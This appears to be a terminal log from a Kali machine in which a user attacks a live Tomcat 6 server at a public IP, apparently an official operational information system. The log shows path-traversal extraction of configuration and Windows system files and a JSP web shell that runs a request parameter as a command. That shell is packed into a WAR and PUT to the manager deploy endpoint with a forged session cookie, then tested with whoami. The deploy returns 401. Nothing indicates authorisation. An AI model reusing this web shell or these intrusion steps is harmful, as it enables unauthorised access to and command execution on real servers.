@@ -1,0 +1,191 @@
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ python3 session_attack_fixed.py 
+=== TESTING SESSION ACCESS ===
+/manager/html: Status 401 - Length: 2635
+/manager/list: Status 401 - Length: 2635
+/manager/status: Status 401 - Length: 2635
+/jsp/: Status 200 - Length: 1750
+   ✅ ACCESO CONCEDIDO!
+/examples/jsp/: Status 200 - Length: 16658
+   ✅ ACCESO CONCEDIDO!
+
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux/Scrpits]
+└─$ ./NScript.sh 
+=== EXTRACTING TOMCAT-USERS.XML ===
+curl: (3) URL rejected: Malformed input to a URL function
+=== EXTRACTING SERVER.XML ===
+curl: (3) URL rejected: Malformed input to a URL function=== EXTRACTION COMPLETE ===
+-rw-rw-r-- 1 marco-os marco-os    0 oct  8 22:07  extracted_creds.txt
+-rw-rw-r-- 1 marco-os marco-os    0 oct  9 18:33 'extracted_.._.._.._.._.._.._.._.._Program Files_Apache Software Foundation_Tomcat 6.0_conf_tomcat-users.xml.txt'
+-rw-rw-r-- 1 marco-os marco-os    0 oct  9 18:33 'extracted_.._.._.._.._.._.._.._.._Tomcat 6.0_conf_server.xml.txt'
+-rw-rw-r-- 1 marco-os marco-os    0 oct  9 18:33 'extracted_.._.._.._.._.._.._.._.._Tomcat 6.0_webapps_sito_WEB-INF_classes_application.properties.txt'
+-rw-rw-r-- 1 marco-os marco-os    0 oct  9 18:33 'extracted_.._.._.._.._.._.._.._.._Tomcat 6.0_webapps_sito_WEB-INF_web.xml.txt'
+-rw-rw-r-- 1 marco-os marco-os 3579 oct  9 18:43  extracted_WINDOWS_system32_drivers_etc_hosts
+-rw-rw-r-- 1 marco-os marco-os 3579 oct  9 18:33  extracted_.._.._.._.._.._.._.._.._WINDOWS_system32_drivers_etc_hosts.txt
+-rw-rw-r-- 1 marco-os marco-os 3579 oct  9 18:43  extracted_WINDOWS_system32_inetsrv_MetaBase.xml
+-rw-rw-r-- 1 marco-os marco-os 3579 oct  9 18:43  extracted_WINDOWS_system.ini
+-rw-rw-r-- 1 marco-os marco-os 3579 oct  9 18:43  extracted_WINDOWS_win.ini
+-rw-rw-r-- 1 marco-os marco-os    0 oct  8 22:07  extracted_words.txt
+                                                                       
+=== EXTRACTING WEB.XML ===
+curl: (3) URL rejected: Malformed input to a URL function
+=== CHECKING EXTRACTED FILES ===
+ls: no se puede acceder a '*.xml': No existe el fichero o el directorio
+--- *.xml ---
+head: no se puede abrir '*.xml' para lectura: No existe el fichero o el directorio
+
+
+└─$ ./scHoy.sh          
+=== TESTING MANAGER ENDPOINTS ===
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2635    0  2635    0     0   7362      0 --:--:-- --:--:-- --:--:--  7380
+Manager HTML: 0 (0=éxito)
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2635    0  2635    0     0   7655      0 --:--:-- --:--:-- --:--:--  7637
+Manager List: 0 (0=éxito)
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2635    0  2635    0     0   7888      0 --:--:-- --:--:-- --:--:--  7912
+Manager Status: 0 (0=éxito)
+./scHoy.sh: 18: [[: not found
+./scHoy.sh: 18: [[: not found
+./scHoy.sh: 18: [[: not found
+                                  
+             
+┌──(marco-os㉿Marco-Antonio)-[~/Escritorio/ProyectoSitoOfi-main/NuevoComienzoLinux]
+└─$ >....                                                                               
+<%
+if(request.getParameter("c")!=null) {
+    Process p=Runtime.getRuntime().exec(request.getParameter("c"));
+    DataInputStream dis=new DataInputStream(p.getInputStream());
+    String disr=dis.readLine();
+    while(disr!=null){out.println(disr);disr=dis.readLine();}
+}
+%>
+EOF
+
+cat > WEB-INF/web.xml << 'EOF'
+<?xml version="1.0"?>
+<web-app></web-app>
+EOF
+
+# Crear WAR mínimo
+zip -q -r ../mini.war *
+cd ..
+
+echo "=== INTENTANDO DEPLOY ==="
+curl -k -b "JSESSIONID=00000000000000000000000000000000" \
+     -X PUT \
+     --upload-file mini.war \
+     "https://189.254.143.102/manager/deploy?path=/mini"
+
+echo "=== VERIFICANDO DEPLOY ==="
+curl -k "https://189.254.143.102/mini/mini.jsp?c=whoami"
+=== INTENTANDO DEPLOY ===
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+ <head>
+  <title>401 Unauthorized</title>
+  <style type="text/css">
+    <!--
+    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
+    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
+    PRE, TT {border: 1px dotted #525D76}
+    A {color : black;}A.name {color : black;}
+    -->
+  </style>
+ </head>
+ <body>
+   <h1>401 Unauthorized</h1>
+   <p>
+    You are not authorized to view this page. If you have not changed
+    any configuration files, please examine the file
+    <tt>conf/tomcat-users.xml</tt> in your installation. That
+    file must contain the credentials to let you use this webapp.
+   </p>
+   <p>
+    For example, to add the <tt>manager-gui</tt> role to a user named
+    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
+    config file listed above.
+   </p>
+<pre>
+&lt;role rolename="manager-gui"/&gt;
+&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
+</pre>
+   <p>
+    Note that for Tomcat 6.0.30 onwards, the roles required to use the manager
+    application were changed from the single <tt>manager</tt> role to the
+    following four roles. You will need to assign the role(s) required for
+    the functionality you wish to access.
+   </p>
+    <ul>
+      <li><tt>manager-gui</tt> - allows access to the HTML GUI and the status
+          pages</li>
+      <li><tt>manager-script</tt> - allows access to the text interface and the
+          status pages</li>
+      <li><tt>manager-jmx</tt> - allows access to the JMX proxy and the status
+          pages</li>
+      <li><tt>manager-status</tt> - allows access to the status pages only</li>
+    </ul>
+   <p>
+    The HTML interface is protected against CSRF but the text and JMX interfaces
+    are not. To maintain the CSRF protection:
+   </p>
+   <ul>
+    <li>The deprecated <tt>manager</tt> role should not be assigned to any
+        user.</li>
+    <li>Users with the <tt>manager-gui</tt> role should not be granted either
+        the <tt>manager-script</tt> or <tt>manager-jmx</tt> roles.</li>
+    <li>If the text or jmx interfaces are accessed through a browser (e.g. for
+        testing since these interfaces are intended for tools not humans) then
+        the browser must be closed afterwards to terminate the session.</li>
+   </ul>
+   <p>
+    For more information - please see the
+    <a href="/docs/manager-howto.html">Manager App HOW-TO</a>.
+   </p>
+ </body>
+
+</html>=== VERIFICANDO DEPLOY ===
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title> Sistema de Informaci�n T�ctico Operativo </title>
+
+        <link rel="stylesheet" href="/styles2/pages.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/tables.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/cells.css" type="text/css">
+        <link rel="stylesheet" href="/styles2/characters.css" type="text/css">
+</head>
+
+<body>
+<form name="forma" method="post" action="">
+        <br>
+        <table class="TablaDatosTitulo" width="100%" align="center" cellpadding="0" cellspacing="0">
+                  <th class="CeldaDatosTitulo"> Error 404</th>
+        </table>
+        <table border="0" width="100%" align="center" cellpadding="0" cellspacing="0">
+                <colgroup>
+                        <col width="20%"> <col width="80%">
+                </colgroup>
+                <tr class="CeldaDatos">
+                        <td colspan="2">&nbsp;  </td>
+                </tr>
+                <tr class="CeldaDatos">
+                        <td align="center"> <img src="/images/error404.png"> </td>
+                        <td><b> Error 404, p�gina no encontrada, por favor reportarlo al departamento de Sistemas Inform�ticos</b></td>
+                </tr>
+                <tr class="CeldaDatos">
+                        <td colspan="2">&nbsp;  </td>
+                </tr>
+        </table>
+</form>
+</body>
+</html>                                                                                                    
